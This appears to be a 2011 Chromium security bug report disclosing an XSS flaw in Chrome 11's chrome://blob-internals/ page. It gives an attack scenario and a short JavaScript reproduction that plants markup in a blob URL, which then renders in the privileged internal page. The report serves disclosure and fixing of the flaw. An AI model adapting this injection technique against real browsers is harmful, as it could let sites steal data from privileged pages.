# chrome://blob-internals/ xss

#### Feb 28 2011

### VULNERABILITY DETAILS

> Attack scenario:
>
> 1.  Person visits an evil site. it runs this code which install a url in the form of javascript - like `<script>` which can steal data from chrome:// url
> 2.  Asks user to visit chrome://blob-internals or asks to install extension that navigates to chrome://blob-internals.

#### VERSION

Chrome: 11.0.672.2 (Windows XP SP3)

#### REPRODUCTION CASE

```html
<script>
var builder = new BlobBuilder();
var blob = builder.getBlob("<input>");
var url = window.webkitURL.createObjectURL(blob);
</script>
```

then goto chrome://blob-internals/

Link: https://bugs.chromium.org/p/chromium/issues/detail?id=74372
